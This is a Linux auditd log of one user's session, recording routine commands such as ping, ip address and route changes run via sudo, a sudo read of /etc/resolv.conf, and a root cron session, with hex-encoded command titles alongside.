type=PATH msg=audit(1789326467.821:53): item=0 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.821:53): item=1 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.821:53): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.821:53): proctitle=6964002D75
type=SYSCALL msg=audit(1789326467.845:54): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a512e00 a1=55a97a5264f0 a2=55a97a447390 a3=0 items=3 ppid=630 pid=632 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="dircolors" exe="/usr/bin/dircolors" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.845:54): argc=2 a0="dircolors" a1="-b"
type=CWD msg=audit(1789326467.845:54): cwd="/home/Tom"
type=PATH msg=audit(1789326467.845:54): item=0 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.845:54): item=1 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.845:54): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.845:54): proctitle=646972636F6C6F7273002D62
type=SYSCALL msg=audit(1789326481.405:55): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4a5670 a1=55a97a526970 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=633 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789326481.405:55): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789326481.405:55): argc=2 a0="ping" a1="github.com"
type=CWD msg=audit(1789326481.405:55): cwd="/home/Tom"
type=PATH msg=audit(1789326481.405:55): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326481.405:55): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326481.405:55): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326481.405:55): proctitle=70696E67006769746875622E636F6D
type=SYSCALL msg=audit(1789326496.769:56): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4ff1f0 a1=55a97a462ab0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=634 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789326496.769:56): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789326496.769:56): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789326496.769:56): cwd="/home/Tom"
type=PATH msg=audit(1789326496.769:56): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326496.769:56): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326496.769:56): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326496.769:56): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789326526.321:57): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a526c50 a1=55a97a462a90 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=635 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326526.321:57): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789326526.321:57): cwd="/home/Tom"
type=PATH msg=audit(1789326526.321:57): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326526.321:57): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326526.321:57): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326526.321:57): proctitle=69700061
type=SYSCALL msg=audit(1789326688.709:58): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a481f30 a1=55a97a515f50 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=636 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326688.709:58): argc=3 a0="sudo" a1="cat" a2="/etc/resolv.conf"
type=CWD msg=audit(1789326688.709:58): cwd="/home/Tom"
type=PATH msg=audit(1789326688.709:58): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326688.709:58): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326688.709:58): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326688.709:58): proctitle=7375646F00636174002F6574632F7265736F6C762E636F6E66
type=USER_AUTH msg=audit(1789326693.841:59): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789326693.841:60): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789326693.845:61): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=636174202F6574632F7265736F6C762E636F6E66 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789326693.845:62): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789326693.845:63): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789326693.849:64): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789326693.849:65): pid=636 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789326909.785:66): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5437f0 a1=55a97a5437d0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=642 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789326909.785:66): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789326909.785:66): argc=2 a0="ping" a1="198.51.100.1"
type=CWD msg=audit(1789326909.785:66): cwd="/home/Tom"
type=PATH msg=audit(1789326909.785:66): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326909.785:66): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326909.785:66): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326909.785:66): proctitle=70696E67003139382E35312E3130302E31
type=USER_ACCT msg=audit(1789327021.541:67): pid=643 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789327021.541:68): pid=643 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789327021.541:69): pid=643 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=3 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789327021.541:69): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=643 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=3 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789327021.541:69): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789327021.541:70): pid=643 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789327021.541:71): pid=644 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789327021.545:72): pid=643 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789327021.545:73): pid=643 uid=0 auid=0 ses=3 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789327099.717:74): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a4b0730 a1=55a97a5156a0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=649 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327099.717:74): argc=7 a0="sudo" a1="ip" a2="addr" a3="add" a4="198.51.100.21/24" a5="dev" a6="eth1"
type=CWD msg=audit(1789327099.717:74): cwd="/home/Tom"
type=PATH msg=audit(1789327099.717:74): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327099.717:74): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327099.717:74): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327099.717:74): proctitle=7375646F006970006164647200616464003139382E35312E3130302E32312F3234006465760065746831
type=USER_ACCT msg=audit(1789327099.725:75): pid=649 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327099.725:76): pid=649 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220616464203139382E35312E3130302E32312F3234206465762065746831 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327099.729:77): pid=649 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327099.729:78): pid=649 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327099.737:79): pid=649 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327099.737:80): pid=649 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327103.753:81): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a447210 a1=55a97a5156a0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=654 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327103.753:81): argc=7 a0="sudo" a1="ip" a2="addr" a3="add" a4="198.51.100.21/24" a5="dev" a6="eth0"
type=CWD msg=audit(1789327103.753:81): cwd="/home/Tom"
type=PATH msg=audit(1789327103.753:81): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327103.753:81): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327103.753:81): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327103.753:81): proctitle=7375646F006970006164647200616464003139382E35312E3130302E32312F3234006465760065746830
type=USER_ACCT msg=audit(1789327103.757:82): pid=654 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327103.757:83): pid=654 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220616464203139382E35312E3130302E32312F3234206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327103.761:84): pid=654 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327103.761:85): pid=654 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327103.765:86): pid=654 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327103.765:87): pid=654 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327118.433:88): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5209d0 a1=55a97a541bf0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=658 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327118.433:88): argc=6 a0="sudo" a1="ip" a2="link" a3="set" a4="eth0" a5="up"
type=CWD msg=audit(1789327118.433:88): cwd="/home/Tom"
type=PATH msg=audit(1789327118.433:88): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327118.433:88): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327118.433:88): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327118.433:88): proctitle=7375646F006970006C696E6B007365740065746830007570
type=USER_ACCT msg=audit(1789327118.437:89): pid=658 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327118.437:90): pid=658 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206C696E6B207365742065746830207570 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327118.441:91): pid=658 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327118.441:92): pid=658 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327118.445:93): pid=658 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327118.445:94): pid=658 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327136.053:95): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a462a90 a1=55a97a5156a0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=661 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327136.053:95): argc=7 a0="sudo" a1="ip" a2="route" a3="replace" a4="default" a5="via" a6="198.51.100.1"
type=CWD msg=audit(1789327136.053:95): cwd="/home/Tom"
type=PATH msg=audit(1789327136.053:95): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327136.053:95): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327136.053:95): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327136.053:95): proctitle=7375646F00697000726F757465007265706C6163650064656661756C7400766961003139382E35312E3130302E31
type=USER_ACCT msg=audit(1789327136.061:96): pid=661 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327136.061:97): pid=661 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465207265706C6163652064656661756C7420766961203139382E35312E3130302E31 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327136.065:98): pid=661 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327136.065:99): pid=661 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
